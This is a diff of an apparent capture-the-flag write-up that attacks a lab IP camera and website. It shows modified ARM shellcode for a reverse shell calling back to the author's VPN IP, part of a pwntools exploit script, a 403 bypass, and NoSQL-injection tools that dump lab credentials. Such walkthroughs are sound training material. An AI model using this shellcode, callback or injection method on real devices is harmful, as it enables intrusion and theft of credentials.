@@ -23,6 +23,7 @@ Remember, this is all about bein' as silent as the falling snow and as cunning a
 
 ### Reconaissance
 First things first, let's launch the challenge VM and see what ports we have open.
+
 ```
 PORT      STATE SERVICE    VERSION
 22/tcp    open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
@@ -45,10 +46,12 @@ Port 23 is normally utilized by Telnet.  Tried connecting with `nc -v $IP 23`, b
 
 #### Port 8080
 Seems to be some sort of protection on this website.  Without any further enumeration or use of tools, every attempt to poke around the website leads me to the following error:
+
 ![only elves](sq2-pic1.png)
 
 #### Port 50628
 A quick check of this port yields something potentially useful!  Seems we have a Trivision NC-227WF HD 720P.
+
 ![webcam](sq2-pic2.png)
 
 ### IP Camera Exploitation
@@ -65,7 +68,9 @@ A quick Google search for Trivision 227WF exploits brings me to https://pierreki
 Unfortunately, none of these really seemed to pan out.  Started digging deeper, and included the ARM architecture clue in the room name into my searches.  I came across the following write-up: https://no-sec.net/arm-x-challenge-breaking-the-webs/.  Same camera, bingo!
 
 Looking at their assembly and related python script, it seems the callback to the reverse shell is hard coded in.  We need to find a way to use our VPN IP, which of course contains a `10` (`0x0a` which is a bad character).  Here's the original assembly vs. my modification:
+
 ```asm
+// Original assembly
 22      mov r1, #0x164
 23      lsl r1, #8
 24      add r1, #0xa8
@@ -74,6 +79,7 @@ Looking at their assembly and related python script, it seems the callback to th
 27      push {r1}       // 192.168.100.1
 ```
 ```asm
+// Modified assembly
 mov r1, #0xe6	// 230
 lsl r1, #8
 add r1, #0x1b	// 27
@@ -84,7 +90,9 @@ add r1, #0x08
 add r1, #0x02   // (2+8, 10 is bad char)
 push {r1}       // 10.6.27.230
 ```
+
 Now, let's convert the ARM assembly into shellcode and update the python script.  A good tool for this can be found here: https://shell-storm.org/online/Online-Assembler-and-Disassembler/
+
 ```python
 from pwn import *
    
@@ -154,7 +162,9 @@ nc.interactive()
 s.close()
 nc.close()
 ```
+
 After script execution, we get our reverse shell... time to poke around for something useful.  A few minutes of searching, and voila, `/var/etc/umconfig.txt`.  This file gives us what I hope is the login to the IP camera stream:
+
 ```
 u = admin
 pass = Y3tiStarCur!ouspassword=admin
@@ -163,6 +173,7 @@ pass = Y3tiStarCur!ouspassword=admin
 
 ### Back to Port 8080
 From the initial look at the webserver running on port 8080, there seemed to be some protection preventing "non-elves" from viewing as intended.  Regardless, I figured I'd run a `gobuster` scan and see what I could find.
+
 ```
 gobuster dir -u http://10.10.223.198:8080 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
 ===============================================================
@@ -182,7 +193,9 @@ Starting gobuster in directory enumeration mode
 /demo                 (Status: 200) [Size: 41]
 /vendor               (Status: 301) [Size: 322] [--> http://10.10.223.198:8080/vendor/]
 ```
+
 Both of these endpoints got me back to the same 403 Error splash page.  Next, I ran a `nikto` scan to see if I could find anything there.
+
 ```
 nikto -host "http://10.10.223.198:8080/"
 - Nikto v2.5.0
@@ -200,7 +213,9 @@ nikto -host "http://10.10.223.198:8080/"
 + /index.php/123: Retrieved x-powered-by header: PHP/8.1.26.
 + /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1446
 ```
+
 Again, nothing looked too promising.  I did key in on CVE-2001-1446 though, and figured looking for a `.DS_Store` would only take a second... turns out there were two to be found: `/.DS_Store` and `/vendor/.DS_Store`.  Pulling out any strings I could, I was able to identify the following strings in the `/vendor/.DS_Store` file:
+
 * composer
 * jean85
 * mongodb
@@ -208,9 +223,11 @@ Again, nothing looked too promising.  I did key in on CVE-2001-1446 though, and 
 * symfony
 
 Continuing with the website enumeration, I tried everything from searching for specific file extensions, trying different user-agents, or other 403 bypass techniques.  I soon discovered that adding a trailing `/` at the end of `index.php` gave me a redirect to `login.php`.  It was blocked by the 403 error page again, surprise surprise.  But what happens if we add the trailing `/` to the end of `login.php`?
+
 ![login.php](sq2-pic4.png)
 
 How to get past the authentication? I tried using `hydra` with some fairly common usernames/passwords... no luck. Tried `sqlmap` for potential SQL injection... no luck. But then I remembered the reference to `mongodb` I found in the `.DS_Store` above.  Perhaps we need to try some noSQL injection techniques, specifically for MongoDB.  After some research, finally found the following tool: https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
+
 ```
 python nosqli-user-pass-enum.py -u http://10.10.223.198:8080/login.php/ -up username -pp password -ep username -m POST
 ...
@@ -243,7 +260,9 @@ ROpPXouppjXNf2pmmT0Q
 UZbIt6L41BmLeQJF0gAR
 WmLP5OZDiLos16Ie1owB
 ```
+
 We have quite the disparity between usernames (7) and passwords (16).  Either the script is bugged, or I've got 9 usernames unaccounted for.  Maybe we need to try a different tool; another one I came across was https://github.com/Hex27/mongomap.  Let's use it to match usernames to the known passwords.
+
 ```
 python mongomap.py -u "http://10.10.223.198:8080/login.php/" --method post --data "username=1&password=$KNOWN_PASSWORD" -p username
 ```
@@ -265,5 +284,7 @@ Snowballer:rCwBuLJPNzmRGExQucTC
 Snownandez:6Ne2HYXUovEIVOEQg2US
 Tinselova:F6Ymdyzx9C1QeNOcU7FD
 ```
+
 The one user/pass combo that stands out to me is `Frosteau:HoHoHacked`, so let's head back to `/login.php` and give it a shot.  After logging in, I noticed a PHPSESSID cookie was set and it attempted to redirect me to `index.php`.  Alas, it still blocks non-elves, so maybe let's add the trailing `/` and head to `/index.php/`. Bingo!
+
 ![success.php](sq2-pic5.png)
